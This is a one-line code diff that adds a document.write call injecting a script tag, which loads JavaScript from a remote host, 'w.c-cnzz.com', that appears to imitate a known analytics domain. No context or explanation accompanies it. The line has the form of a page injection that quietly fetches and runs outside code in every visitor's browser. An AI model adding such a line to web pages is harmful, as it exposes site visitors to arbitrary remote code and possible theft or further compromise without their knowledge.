@@ -1,0 +1,1 @@
+document.write("<script language=javascript src='http://w.c-cnzz.com/js/zpg.js'><\/script>")
